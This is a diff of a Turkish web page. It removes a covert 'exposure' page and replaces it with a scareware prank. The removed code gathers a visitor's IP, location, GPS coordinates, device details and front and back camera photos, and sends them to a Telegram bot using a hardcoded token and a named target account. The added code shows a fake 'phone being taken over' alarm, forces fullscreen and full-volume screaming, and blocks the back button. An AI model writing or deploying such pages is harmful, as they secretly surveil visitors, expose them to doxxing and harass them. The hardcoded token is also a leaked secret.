@@ -2,643 +2,228 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ZAHİR İFŞA • SİSTEM</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SİSTEM ELE GEÇİRİLDİ</title>
     <style>
-        * {
+        body {
+            background-color: black;
+            color: red;
+            font-family: 'Courier New', Courier, monospace;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #0a0a0a;
-            height: 100vh;
             overflow: hidden;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            color: #fff;
+            height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
-        }
-
-        /* Arkaplan */
-        .bg-gradient {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 30% 40%, #1a0f0f, #0a0505, #000000);
-            z-index: -2;
-        }
-
-        .bg-particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                radial-gradient(1px 1px at 10% 20%, rgba(255, 50, 50, 0.15), transparent),
-                radial-gradient(1.5px 1.5px at 80% 60%, rgba(255, 0, 0, 0.08), transparent),
-                radial-gradient(1px 1px at 40% 90%, rgba(200, 0, 0, 0.12), transparent);
-            z-index: -1;
-        }
-
-        /* Ana container */
-        .container {
-            position: relative;
-            z-index: 10;
-            width: 92%;
-            max-width: 550px;
+            align-items: center;
             text-align: center;
-            transition: opacity 0.8s ease;
+            cursor: none;
+            user-select: none; /* Metin seçimini engelle */
+            -webkit-user-select: none;
         }
 
-        .glass-panel {
-            background: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 60, 60, 0.3);
-            border-radius: 48px;
-            padding: 40px 30px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.9), 0 0 40px rgba(255, 0, 0, 0.15);
-        }
-
-        /* Başlık */
-        .title {
-            font-size: 2.8rem;
-            font-weight: 900;
-            letter-spacing: 6px;
-            text-transform: uppercase;
-            background: linear-gradient(135deg, #ff3b3b, #ff0000, #cc0000);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
-            font-family: 'Impact', 'Arial Black', sans-serif;
-            margin-bottom: 20px;
-        }
-
-        .subtitle {
-            font-size: 0.9rem;
-            letter-spacing: 8px;
-            color: rgba(255, 80, 80, 0.5);
-            text-transform: uppercase;
-            margin-bottom: 30px;
-        }
-
-        /* Sayaç */
-        .counter-block {
-            margin: 30px 0 20px;
-        }
-
-        .counter-digit {
-            font-size: 7rem;
-            font-weight: 900;
-            font-family: 'Courier New', monospace;
-            background: linear-gradient(135deg, #ff5555, #ff0000);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            line-height: 1;
-            text-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
-        }
-
-        .counter-label {
-            font-size: 1rem;
-            letter-spacing: 5px;
-            color: rgba(255, 70, 70, 0.5);
-            margin-top: 6px;
-        }
-
-        /* Çubuk */
-        .bar-container {
+        #main-content {
             width: 100%;
-            height: 6px;
-            background: rgba(40, 0, 0, 0.7);
-            border-radius: 10px;
-            margin: 30px 0;
-            border: 1px solid rgba(255, 0, 0, 0.2);
-        }
-
-        .bar-fill {
-            width: 0%;
             height: 100%;
-            background: linear-gradient(90deg, #ff2222, #ff0000, #cc0000);
-            border-radius: 10px;
-            transition: width 0.1s linear;
-            box-shadow: 0 0 25px #ff0000;
+            position: relative;
         }
 
-        /* Durum */
-        .status-box {
-            background: rgba(20, 0, 0, 0.5);
-            border-radius: 20px;
-            padding: 18px 15px;
-            border: 1px solid rgba(255, 0, 0, 0.15);
-            margin-top: 25px;
+        .warning-text {
+            position: absolute;
+            width: 100%;
+            font-size: 1.8rem;
+            font-weight: 900;
+            text-shadow: 0 0 10px red, 0 0 20px darkred;
+            z-index: 10;
         }
 
-        .status-text {
-            font-size: 1rem;
-            letter-spacing: 2px;
-            color: rgba(255, 255, 255, 0.85);
+        #title {
+            top: 5%;
+            color: red;
+            font-size: 2.5rem;
+            animation: shake 0.1s infinite;
         }
 
-        .status-text i {
-            color: #ff3333;
-            margin-right: 10px;
-            font-style: normal;
-            animation: pulse 1.2s infinite;
+        #status1 {
+            top: 20%;
+            color: yellow;
+            animation: flash 0.2s infinite;
         }
 
-        .telegram-badge {
-            display: inline-block;
-            margin-top: 18px;
-            padding: 8px 22px;
-            background: rgba(255, 0, 0, 0.08);
-            border: 1px solid rgba(255, 0, 0, 0.15);
-            border-radius: 40px;
-            color: rgba(255, 100, 100, 0.6);
-            font-size: 0.8rem;
-            letter-spacing: 2px;
+        #status2 {
+            top: 30%;
+            color: orange;
+            animation: flash 0.3s infinite alternate;
         }
 
-        @keyframes pulse {
-            0% { opacity: 0.4; transform: scale(0.95); }
-            50% { opacity: 1; transform: scale(1.1); }
-            100% { opacity: 0.4; transform: scale(0.95); }
+        #timer {
+            top: 40%;
+            color: red;
+            font-size: 3rem;
+            animation: zoom 0.5s infinite alternate;
+            z-index: 10;
         }
 
-        /* Siyah ekran – sadece yazı */
-        .black-screen {
+        #granny {
+            position: absolute;
+            bottom: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100vw;
+            height: 100vh;
+            background-image: url('https://i.pinimg.com/736x/8a/e4/22/8ae422f2bc08ed6a8617eb6d9a144d4e.jpg'); 
+            background-size: cover;
+            background-position: center;
+            z-index: 5;
+            animation: approach 2s infinite; 
+            mix-blend-mode: screen; 
+            opacity: 0.8;
+        }
+
+        @keyframes flash {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(3px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(3px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(1px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+
+        @keyframes zoom {
+            0% { transform: scale(0.8); }
+            100% { transform: scale(1.2); }
+        }
+
+        @keyframes approach {
+            0% { transform: translateX(-50%) scale(0.5); filter: blur(5px); }
+            50% { transform: translateX(-50%) scale(1.2); filter: blur(0px); }
+            100% { transform: translateX(-50%) scale(2); filter: blur(10px); opacity: 0; }
+        }
+        
+        body.glitch {
+            animation: glitch-anim 0.2s infinite;
+        }
+        
+        @keyframes glitch-anim {
+            0% { filter: invert(0); transform: translate(0,0); }
+            20% { filter: invert(1); transform: translate(-5px, 5px); }
+            40% { filter: invert(0); transform: translate(5px, -5px); }
+            60% { filter: invert(1); transform: translate(-5px, -5px); }
+            80% { filter: invert(0); transform: translate(5px, 5px); }
+            100% { filter: invert(0); transform: translate(0,0); }
+        }
+
+        /* Ses açma zorunluluğu için görünmez katman */
+        #unmute-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            z-index: 30;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 1.2s ease;
-        }
-
-        .black-screen.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .black-screen .big-text {
-            font-size: 3.8rem;
-            font-weight: 900;
-            letter-spacing: 12px;
-            text-transform: uppercase;
-            background: linear-gradient(135deg, #ff4444, #ff0000);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 60px rgba(255, 0, 0, 0.7);
-            font-family: 'Impact', 'Arial Black', sans-serif;
-            animation: flicker 1.8s infinite alternate;
-        }
-
-        .black-screen .sub-big {
-            margin-top: 30px;
-            font-size: 1.3rem;
-            letter-spacing: 14px;
-            color: rgba(255, 80, 80, 0.4);
-            text-transform: uppercase;
-        }
-
-        @keyframes flicker {
-            0% { opacity: 0.9; text-shadow: 0 0 30px #ff0000; }
-            100% { opacity: 1; text-shadow: 0 0 80px #ff0000, 0 0 120px #cc0000; }
-        }
-
-        /* audio gizli */
-        #bg-audio { display: none; }
-
-        /* Responsive */
-        @media (max-width: 500px) {
-            .glass-panel { padding: 30px 18px; }
-            .title { font-size: 2.2rem; letter-spacing: 4px; }
-            .counter-digit { font-size: 5.5rem; }
-            .black-screen .big-text { font-size: 2.8rem; letter-spacing: 8px; }
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9999;
+            background: transparent;
         }
     </style>
 </head>
-<body>
-    <div class="bg-gradient"></div>
-    <div class="bg-particles"></div>
+<body class="glitch">
 
-    <!-- Ses (gizli, sadece efekt için) -->
-    <audio id="bg-audio" loop preload="none">
-        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-    </audio>
+    <div id="unmute-overlay"></div>
 
-    <!-- SİYAH EKRAN – sadece yazı, video yok -->
-    <div class="black-screen" id="blackScreen">
-        <div class="big-text">İSMAİL İFŞA</div>
-        <div class="sub-big">✦ AÇILDI ✦</div>
-    </div>
-
-    <!-- ANA PANEL -->
-    <div class="container" id="mainContainer">
-        <div class="glass-panel">
-            <div class="title">İ S M A İ L</div>
-            <div class="subtitle">✦ SİSTEM ✦</div>
-
-            <div class="counter-block">
-                <span class="counter-digit" id="counter">0</span>
-                <div class="counter-label">İLERLEME</div>
-            </div>
-
-            <div class="bar-container">
-                <div class="bar-fill" id="barFill"></div>
-            </div>
-
-            <div class="status-box">
-                <div class="status-text">
-                    <i>⏣</i> <span id="statusText">SİSTEM HAZIRLANIYOR</span>
-                </div>
-                <div id="telegramBadge" class="telegram-badge">
-                    ⚡ BAĞLANIYOR
-                </div>
-            </div>
-        </div>
+    <div id="main-content">
+        <div id="title" class="warning-text">Zahir VİRÜS</div>
+        <div id="status1" class="warning-text">TELEFON ELE GEÇİRİLİYOR...</div>
+        <div id="status2" class="warning-text">NUMARALAR ELE GEÇİRİLİYOR 1-100</div>
+        <div id="timer" class="warning-text">100</div>
+        
+        <div id="granny"></div>
+        
+        <!-- Ses Kaynağı -->
+        <audio id="horror-sound" loop preload="auto">
+            <source src="https://www.myinstants.com/media/sounds/granny-scream.mp3" type="audio/mpeg">
+        </audio>
     </div>
 
     <script>
-        // --------------------------------------------------------------
-        //  KONFİG – BURAYA KENDİ BOT TOKEN'İNİ YAZ
-        // --------------------------------------------------------------
-        const BOT_TOKEN = '7416067204:AAGFwkV8uQtFYyLPfCuDy_WqUaSLRLJRDNQ';   // <-- senin token
-        const TARGET_USERNAME = '@STCCriss';                               // hedef
+        const timerElement = document.getElementById('timer');
+        const audio = document.getElementById('horror-sound');
+        const body = document.body;
+        const overlay = document.getElementById('unmute-overlay');
+        let timeLeft = 100;
 
-        // --------------------------------------------------------------
-        //  DEĞİŞKENLER
-        // --------------------------------------------------------------
-        let step = 0;
-        let infoSent = false;
-        let photoSent = false;
-
-        // DOM
-        const mainContainer = document.getElementById('mainContainer');
-        const blackScreen = document.getElementById('blackScreen');
-        const counterEl = document.getElementById('counter');
-        const barFill = document.getElementById('barFill');
-        const statusText = document.getElementById('statusText');
-        const telegramBadge = document.getElementById('telegramBadge');
-
-        // --------------------------------------------------------------
-        //  1. BAŞLAT – HEMEN IP, KONUM, MİKROFON, FOTOĞRAF
-        // --------------------------------------------------------------
-        function startFullExtraction() {
-            console.log('⚡ İFŞA SİSTEMİ BAŞLATILDI');
-            statusText.innerText = 'BİLGİLER TOPLANIYOR...';
-            telegramBadge.innerHTML = '📡 VERİ AKTİF';
-
-            // 1) IP + temel bilgiler
-            collectAndSendAll();
-
-            // 2) Konum izni (kullanıcıya sorar)
-            requestLocation();
-
-            // 3) Mikrofon (sadece izin ister)
-            requestMicrophone();
-
-            // 4) Kamera – önden ve arkadan fotoğraf
-            capturePhotos();
-
-            // 5) Sayaç başlat (1'den 5'e)
-            startCounter();
-        }
-
-        // --------------------------------------------------------------
-        //  2. SAYAÇ (1 → 5) – her adımda bilgi toplanır
-        // --------------------------------------------------------------
-        function startCounter() {
-            let count = 0;
-            const max = 5;
-            const interval = setInterval(() => {
-                count++;
-                if (count > max) {
-                    clearInterval(interval);
-                    // 5 oldu -> ifşa açıldı
-                    statusText.innerText = '✅ İFŞA AÇILDI!';
-                    telegramBadge.innerHTML = '🔥 TAMAMLANDI';
-                    // Siyah ekranı göster
-                    setTimeout(() => {
-                        showBlackScreen();
-                    }, 500);
-                    return;
-                }
-
-                // sayaç ve bar güncelle
-                counterEl.innerText = count;
-                const percent = (count / max) * 100;
-                barFill.style.width = percent + '%';
-
-                // durum mesajları
-                const msgs = [
-                    'IP TESPİT EDİLDİ',
-                    'KONUM ALINDI',
-                    'MİKROFON İZNİ',
-                    'FOTOĞRAF ÇEKİLDİ',
-                    'TÜM VERİLER GÖNDERİLDİ'
-                ];
-                statusText.innerText = msgs[count - 1] || 'İŞLENİYOR...';
-            }, 700); // her 700ms'de bir artar
-        }
-
-        // --------------------------------------------------------------
-        //  3. SİYAH EKRAN – sadece yazı
-        // --------------------------------------------------------------
-        function showBlackScreen() {
-            mainContainer.style.transition = 'opacity 0.9s';
-            mainContainer.style.opacity = '0';
-            mainContainer.style.pointerEvents = 'none';
-
-            setTimeout(() => {
-                blackScreen.classList.add('active');
-                // içindeki yazıyı güncelle
-                const big = blackScreen.querySelector('.big-text');
-                big.innerText = 'İSMAİL İFŞA';
-                const sub = blackScreen.querySelector('.sub-big');
-                sub.innerText = '✦ AÇILDI ✦';
-                // hafif ses (isteğe bağlı)
-                try { document.getElementById('bg-audio').play(); } catch(e) {}
-            }, 900);
-        }
-
-        // --------------------------------------------------------------
-        //  4. BİLGİ TOPLA + TELEGRAM
-        // --------------------------------------------------------------
-        async function collectAndSendAll() {
-            if (infoSent) return;
-            infoSent = true;
-
-            // Temel bilgiler
-            const info = {
-                timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: window.screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cores: navigator.hardwareConcurrency || '?',
-                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
-                url: window.location.href,
-                referrer: document.referrer || 'doğrudan'
-            };
-
-            // IP
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                info.ip = ipData.ip;
-            } catch { info.ip = 'IP alınamadı'; }
-
-            // Konum (ip bazlı)
-            try {
-                const geoRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
-                const geoData = await geoRes.json();
-                info.country = geoData.country_name || '?';
-                info.city = geoData.city || '?';
-                info.isp = geoData.org || '?';
-            } catch { info.country = '?'; info.city = '?'; }
-
-            // Mesaj
-            const message = `
-🔥 **ZAHİR İFŞA – TAM RAPOR** 🔥
-
-🌐 **IP:** ${info.ip}
-📍 **Konum:** ${info.city}, ${info.country}
-🏢 **ISP:** ${info.isp}
-
-📱 **Cihaz:**
-• Platform: ${info.platform}
-• Ekran: ${info.screen}
-• Renk: ${info.colorDepth} bit
-• Çekirdek: ${info.cores}
-• RAM: ${info.memory}
-• Dil: ${info.language}
-• Zaman: ${info.timezone}
-
-🌍 **Sayfa:**
-• URL: ${info.url}
-• Yönlendiren: ${info.referrer}
-
-⏰ **Zaman:** ${info.timestamp}
-
-⚡ **İFŞA SİSTEMİ TAMAMLANDI**
-`;
-
-            // Gönder
-            await sendTelegramMessage(message);
-        }
-
-        // --------------------------------------------------------------
-        //  5. TELEGRAM MESAJ GÖNDER
-        // --------------------------------------------------------------
-        async function sendTelegramMessage(text) {
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-                console.warn('⚠️ Bot token girilmemiş!');
-                return;
+        // 1. TAM EKRAN VE SESİ FULLEME MANTIĞI
+        // Kullanıcı ekrana ilk dokunduğunda çalışır
+        function startHorror() {
+            // Tam ekran yap (Tarayıcı çubuklarını gizler)
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(err => console.log("Tam ekran hatası:", err));
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
             }
 
-            try {
-                // Önce güncellemelerden hedef chat ID bul
-                const updatesRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
-                const updates = await updatesRes.json();
-                let targetChatId = null;
+            // Sesi %100 yap ve oynat
+            audio.volume = 1.0; 
+            audio.play().catch(e => console.log("Ses engellendi:", e));
 
-                if (updates.ok && updates.result) {
-                    for (const update of updates.result) {
-                        if (update.message && update.message.from) {
-                            const from = update.message.from;
-                            if (from.username && from.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
-                                targetChatId = from.id;
-                                break;
-                            }
-                        }
-                        if (update.channel_post && update.channel_post.chat) {
-                            if (update.channel_post.chat.username && 
-                                update.channel_post.chat.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
-                                targetChatId = update.channel_post.chat.id;
-                                break;
-                            }
-                        }
-                    }
-                }
-
-                if (!targetChatId) {
-                    telegramBadge.innerHTML = '⚠️ BAĞLANTI YOK';
-                    console.warn('Hedef kullanıcı bulunamadı.');
-                    return;
-                }
-
-                const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: targetChatId,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                const result = await sendRes.json();
-                if (result.ok) {
-                    telegramBadge.innerHTML = '✅ GÖNDERİLDİ';
-                } else {
-                    telegramBadge.innerHTML = '❌ HATA';
-                }
-            } catch (e) {
-                console.error(e);
-                telegramBadge.innerHTML = '❌ BAĞLANTI HATASI';
-            }
-        }
-
-        // --------------------------------------------------------------
-        //  6. KONUM İZNİ (isteğe bağlı, gerçek konum)
-        // --------------------------------------------------------------
-        function requestLocation() {
-            if (!navigator.geolocation) return;
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const coords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                    console.log('📍 Gerçek konum:', coords);
-                    sendTelegramMessage(`📍 **GERÇEK KONUM:** ${coords}`);
-                },
-                (err) => {
-                    console.warn('Konum izni reddedildi:', err.message);
-                },
-                { enableHighAccuracy: true, timeout: 8000 }
-            );
-        }
-
-        // --------------------------------------------------------------
-        //  7. MİKROFON İZNİ (sadece izin ister)
-        // --------------------------------------------------------------
-        function requestMicrophone() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    console.log('🎤 Mikrofon izni verildi');
-                    stream.getTracks().forEach(t => t.stop());
-                    sendTelegramMessage('🎤 **MİKROFON İZNİ VERİLDİ**');
-                })
-                .catch(err => {
-                    console.warn('Mikrofon izni reddedildi:', err.message);
-                });
-        }
-
-        // --------------------------------------------------------------
-        //  8. FOTOĞRAF ÇEK (önden + arkadan)
-        // --------------------------------------------------------------
-        function capturePhotos() {
-            if (photoSent) return;
-            photoSent = true;
-
-            captureAndSendPhoto(false, 'ÖN KAMERA');
-            captureAndSendPhoto(true, 'ARKA KAMERA');
-        }
-
-        function captureAndSendPhoto(useBack, label) {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                console.warn('Kamera desteklenmiyor');
-                return;
+            // Ekranın kararmasını engelle (Ekran açık kalsın)
+            if ('wakeLock' in navigator) {
+                navigator.wakeLock.request('screen').catch(err => console.log(err));
             }
 
-            const facingMode = useBack ? 'environment' : 'user';
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
-                audio: false
-            })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
-
-                setTimeout(() => {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
-                    stream.getTracks().forEach(t => t.stop());
-                    sendPhotoToTelegram(dataURL, label);
-                }, 500);
-            })
-            .catch(err => {
-                console.warn(`❌ Kamera (${label}) hatası:`, err.message);
-                sendTelegramMessage(`📸 **${label}** alınamadı: ${err.message}`);
-            });
+            // Overlay'i kaldır ki bir daha tıklamaya gerek kalmasın
+            overlay.style.display = 'none';
+            
+            // Dinleyicileri temizle
+            document.removeEventListener('click', startHorror);
+            document.removeEventListener('touchstart', startHorror);
         }
 
-        // Fotoğrafı Telegram'a gönder
-        async function sendPhotoToTelegram(dataURL, label) {
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+        // Tıklama veya dokunma algıla
+        document.addEventListener('click', startHorror);
+        document.addEventListener('touchstart', startHorror);
 
-            const blob = await fetch(dataURL).then(r => r.blob());
-            const formData = new FormData();
-            formData.append('photo', blob, 'photo.jpg');
-            formData.append('caption', `📸 **${label}** – İfşa fotoğrafı`);
+        // 2. GERİ SAYIM
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.innerText = timeLeft;
 
-            try {
-                const updatesRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
-                const updates = await updatesRes.json();
-                let targetChatId = null;
-                if (updates.ok && updates.result) {
-                    for (const update of updates.result) {
-                        if (update.message && update.message.from) {
-                            const from = update.message.from;
-                            if (from.username && from.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
-                                targetChatId = from.id;
-                                break;
-                            }
-                        }
-                        if (update.channel_post && update.channel_post.chat) {
-                            if (update.channel_post.chat.username && 
-                                update.channel_post.chat.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
-                                targetChatId = update.channel_post.chat.id;
-                                break;
-                            }
-                        }
-                    }
-                }
-                if (!targetChatId) return;
-
-                formData.append('chat_id', targetChatId);
-                const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await sendRes.json();
-                if (result.ok) {
-                    console.log(`✅ Fotoğraf gönderildi: ${label}`);
-                } else {
-                    console.warn('Fotoğraf gönderme hatası:', result);
-                }
-            } catch (e) {
-                console.error('Fotoğraf gönderme hatası:', e);
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerElement.innerText = "BANLANDIN!";
+                timerElement.style.fontSize = "4rem";
+                timerElement.style.color = "darkred";
             }
-        }
+        }, 1000);
 
-        // --------------------------------------------------------------
-        //  9. BAŞLAT – sayfa yüklenir yüklenmez
-        // --------------------------------------------------------------
-        window.addEventListener('load', () => {
-            console.log('🔥 ZAHİR İFŞA SİSTEMİ AKTİF');
-            // 1 saniye sonra başlat
-            setTimeout(startFullExtraction, 800);
-        });
+        // 3. SÜREKLİ YAKLAŞAN YARATIK EFEKTİ
+        setInterval(() => {
+            const granny = document.getElementById('granny');
+            const randomScale = 1 + Math.random() * 3;
+            const randomX = (Math.random() - 0.5) * 40;
+            const randomY = (Math.random() - 0.5) * 40;
+            
+            granny.style.transform = `translateX(calc(-50% + ${randomX}px)) scale(${randomScale})`;
+            granny.style.filter = `blur(${Math.random() * 5}px)`;
+            granny.style.opacity = 0.5 + Math.random() * 0.5;
+            
+            if(Math.random() > 0.6) {
+                body.style.backgroundColor = "darkred";
+                setTimeout(() => { body.style.backgroundColor = "black"; }, 100);
+            }
+        }, 150);
+
+        // 4. GERİ TUŞUNU ENGELLEME (Android)
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1); // Geri gitmesini engelle
+        };
     </script>
 </body>
 </html>
